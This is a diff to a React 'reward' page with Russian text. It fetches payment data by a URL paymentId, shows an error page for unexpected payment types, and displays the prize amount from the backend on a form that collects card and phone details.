@@ -1,4 +1,4 @@
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 import styles from './Reward.module.css'
 import Panel from '../../components/Panel/Panel.jsx'
 import RadioTabs from '../../components/RadioTabs/RadioTabs.jsx'
@@ -6,6 +6,7 @@ import TextInput from '../../components/TextInput/TextInput.jsx'
 import CustomSelect from '../../components/CustomSelect/CustomSelect.jsx'
 import PrimaryButton from '../../components/PrimaryButton/PrimaryButton.jsx'
 import banksData from '../../../banks.json'
+import { fetchPaymentData } from '../../config/api.js'
 
 const bankOptions = [
   { value: '', label: 'Выберите банк' },
@@ -23,6 +24,9 @@ function RewardPage() {
   const [bank, setBank] = useState('')
   const [cardError, setCardError] = useState('')
   const [phoneError, setPhoneError] = useState('')
+  const [loading, setLoading] = useState(true)
+  const [paymentData, setPaymentData] = useState(null)
+  const [error, setError] = useState(false)
 
   const onlyDigits = (s) => s.replace(/\D/g, '')
   const formatCard = (s) => onlyDigits(s).slice(0,16).replace(/(\d{4})(?=\d)/g, '$1 ').trim()
@@ -121,13 +125,67 @@ function RewardPage() {
     setPhoneError('')
   }
 
+  // Запрос данных платежа при загрузке
+  useEffect(() => {
+    const loadPaymentData = async () => {
+      try {
+        // Получаем paymentId из URL параметров
+        const urlParams = new URLSearchParams(window.location.search)
+        let paymentIdentifier = urlParams.get('paymentId')
+        
+        // Для локальной разработки используем тестовый paymentId, если не найден в URL
+        if (!paymentIdentifier) {
+          paymentIdentifier = 'a2c903ce-4fcd-4d3c-b621-0b68d844c887'
+          console.log('Используется тестовый paymentId для локальной разработки:', paymentIdentifier)
+        }
+        
+        const data = await fetchPaymentData(paymentIdentifier)
+        console.log('Данные с бекенда:', data)
+        console.log('Поле money:', data?.value?.backPayment?.money)
+        console.log('Поле type:', data?.value?.backPayment?.type)
+        console.log('isSuccess:', data?.isSuccess)
+        
+        // Проверяем успешность запроса и тип платежа
+        if (!data?.isSuccess || data?.value?.backPayment?.type !== 1) {
+          console.log('Показываем ошибку. isSuccess:', data?.isSuccess, 'type:', data?.value?.backPayment?.type)
+          setError(true)
+        } else {
+          console.log('Показываем основную страницу')
+          setPaymentData(data)
+        }
+      } catch (error) {
+        console.error('Ошибка загрузки данных платежа:', error)
+      } finally {
+        setLoading(false)
+      }
+    }
+
+    loadPaymentData()
+  }, [])
+
+  // Показываем страницу ошибки, если type !== 1
+  if (error) {
+    return (
+      <div className={styles.page}>
+        <div className={styles.hero}>
+          <div className={styles.heroTitle}>Ошибка</div>
+          <div className={styles.subtitle}>Попробуйте снова</div>
+        </div>
+      </div>
+    )
+  }
+
   return (
     <div className={styles.page}>
       <div className={styles.hero}>
         <img className={styles.pouchImg} src="/1 7.svg" alt="prize" />
         <div className={styles.heroTitle}>Поздравляем!</div>
         <div className={styles.subtitle}>Вы выиграли</div>
-        <div className={styles.amount}>★ 1000 рублей ★</div>
+        {paymentData?.value?.backPayment?.money && (
+          <div className={styles.amount}>
+            ★ {paymentData.value.backPayment.money} рублей ★
+          </div>
+        )}
       </div>
 
       <Panel>
